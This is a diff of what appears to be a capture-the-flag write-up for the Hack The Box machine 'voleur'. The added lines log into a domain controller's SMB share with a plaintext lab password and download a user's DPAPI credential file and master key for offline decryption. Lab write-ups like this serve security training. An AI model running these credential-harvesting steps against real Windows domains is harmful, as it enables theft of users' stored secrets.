@@ -392,8 +392,18 @@ Now i have access as `todd.wolfe`
 
 # Extracting DPAPI credentials
 ```python
+faketime -f +8h smbclient -U 'voleur.htb/todd.wolfe%NightT1meP1dg3on14' --realm=voleur.htb //dc.voleur.htb/IT
+Try "help" to get a list of possible commands.
+smb: \>
+```
+
+```python
 smb: \Second-Line Support\Archived Users\todd.wolfe\> get "AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3" 772275FAD58525253490A9B0039791D3
 getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3 of size 398 as 772275FAD58525253490A9B0039791D3 (6.6 KiloBytes/sec) (average 6.6 KiloBytes/sec)
 
-
+smb: \Second-Line Support\Archived Users\todd.wolfe\> get "AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88" 08949382-134f-4c63-b93c-ce52efc0aa88
+getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88 of size 740 as 08949382-134f-4c63-b93c-ce52efc0aa88 (11.3 KiloBytes/sec) (average 9.0 KiloBytes/sec)
 ```
+Now that the user is restored i can log in via SMB and access the share they are stored in
+
+
